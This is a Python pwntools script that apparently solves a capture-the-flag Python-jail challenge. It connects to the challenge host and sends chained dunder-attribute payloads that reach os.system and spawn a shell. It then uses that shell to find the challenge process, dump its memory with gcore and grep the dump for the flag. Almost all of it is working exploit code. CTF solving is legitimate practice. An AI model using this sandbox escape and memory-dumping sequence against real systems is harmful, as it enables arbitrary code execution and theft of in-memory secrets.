#!/usr/bin/env python3

import time
import os

from pwn import *

context.log_level = "CRITICAL"

HOST = os.getenv("HOST", "aie.challs.srdnlen.it")
PORT = int(os.getenv("PORT", 3434))

io = remote(HOST, PORT)

def craft_string(source: str, payload: str) -> str:
    return ",".join([f"s[{source.index(c)}]" for c in payload])

payloads = [
    "[a:=().__class__]", # <class 'tuple'>
    "[a:=a.__base__]", # <class 'object'>
    "[a:=a.__subclasses__()[41:156:114]]", # [<class 'list'>, <class 'os._wrap_close'>]
    "[a:=[a[0],a[1].__init__]]", # [<class 'list'>, <function _wrap_close.__init__ at 0x7f003e1e7100>]
    "[a:=[a[1],a[0](a[1].__globals__)]]", # [<function _wrap_close.__init__ at 0x7f82bab27100>, list(os._wrap_close.__init__.__globals__)]
    "a[0].__globals__[a[1][46]](a[1][57][:3:2])", # os._wrap_close.__init__.__globals__["system"]("sh")
]

io.sendlineafter(b"How many tries do you need to escape? ", str(len(payloads)).encode())

for payload in payloads:
    io.sendlineafter(b"Submit your BEST Escape Plan: ", payload.encode())

time.sleep(0.5) # wait for the shell to spawn

# find the name of the user running the challenge
io.sendline(b"whoami")
user = io.recvline().strip().decode()

# find the PID of the process running the challenge
io.sendline(b"grep -l './chall.py' /proc/[0-9]*/cmdline")
procs = io.recvrepeat(0.5).strip().decode().splitlines()

pid = None
for p in procs:
    io.sendline(f"cat {p}".encode())
    file_data = io.recvrepeat(0.5).strip().decode()
    if user in file_data:
        pid = int(p.split("/")[2])+1
        break

assert pid is not None

# dump the memory of the process
io.sendline(f"gcore {pid}".encode())

time.sleep(0.5) # wait for the memory dump to be created

# extract the flag from the memory dump
io.sendline(b"cat core.* | grep -a -o -e 'srdnlen{.*}'")

flag = max(io.recvrepeat(0.5).strip().decode().splitlines())
print(flag)

io.close()